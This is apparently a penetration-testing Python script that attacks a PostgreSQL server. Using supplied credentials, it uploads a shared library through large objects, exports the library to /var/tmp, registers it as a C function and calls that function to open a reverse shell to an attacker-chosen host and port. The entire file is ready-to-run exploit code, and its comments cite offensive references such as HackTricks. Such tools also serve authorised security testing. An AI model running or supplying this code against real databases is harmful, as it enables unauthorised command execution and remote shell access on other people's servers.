#!/bin/python

"""
https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions
https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql
https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md
https://gist.github.com/0xabe-io/916cf3af33d1c0592a90
"""
import argparse
import psycopg2

parser = argparse.ArgumentParser(description = 'This is parser arguments')

parser.add_argument('-p','--password', help='pass for postgresql')
parser.add_argument('-u','--username', help='user for postgresql')
parser.add_argument('-d','--database', help='database for postgresql')
parser.add_argument('-H','--hostname', help='hostname or IP for postgresql')
parser.add_argument('-P','--port', help='database for postgresql', default='5432')
parser.add_argument('-rh','--rhost', help='ip of host listen reverse')
parser.add_argument('-rp','--rport', help='port of host listen reverse')
parser.add_argument('-f','--filename',required = True, help='file name of lib.so')

args = parser.parse_args()

print(args)

try:
	#create connectiopn to postgreSQL
	conn = psycopg2.connect(database=args.database, host=args.hostname, user=args.username, password=args.password, port=args.port)
	conn.autocommit = True
	#create object with metod to send SQL queries
	cursor = conn.cursor()

	#create large object for our .so lib
	cursor.execute("SELECT lo_create(-1);")
	oid = cursor.fetchone()
	#print(oid[0])
	#conn.commit()

	#open .so file in byte format
	with open(args.filename,'rb') as f:
		
		lib = f.read()

		step = 2 * 1024
		
	#split .so file for 2KB and insert this chuncks info out large object created before
		for i in range(0,len(lib),step):
			cursor.execute("INSERT INTO pg_largeobject (loid, pageno, data) values (" + str(oid[0]) + ", " + str(int(i/step)) + ", decode('" + (lib[i:i + step]).hex() +"', 'hex'));")
			#conn.commit()

	#write large object on file system /var/tmp
	cursor.execute("SELECT lo_export(" + str(oid[0]) + ", '/var/tmp/pg_exec.so');")
	#conn.commit()

	#delete large object in DB
	cursor.execute("SELECT lo_unlink(" + str(oid[0]) + ");")

	#create a DB function from our .so lib
	cursor.execute("CREATE OR REPLACE FUNCTION pg_sys(cstring,cstring) RETURNS int AS '/var/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;")
	#conn.commit()

	#exec our function reverse shell with rhost, rport parameters
	cursor.execute("select pg_sys('" + args.rhost +"','" + args.rport +"');")
	#conn.commit()

	conn.close()
except:
	print("Some thing goes wrong check your connection of parameters!")
